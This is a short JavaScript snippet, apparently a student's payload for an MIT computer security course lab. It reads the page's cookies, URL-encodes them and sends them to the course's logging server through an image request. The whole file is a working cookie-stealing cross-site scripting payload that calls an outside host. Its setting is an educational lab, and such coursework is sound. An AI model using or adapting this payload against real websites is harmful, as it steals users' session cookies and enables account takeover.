var userCookie = encodeURIComponent(document.cookie);
var id = 'nimo'; 
var loggingURL = 'https://css.csail.mit.edu/6.5660/2023/labs/log.php?id=' + id + '&payload=' + userCookie + '&random=' + Math.random();

(new Image()).src = loggingURL;
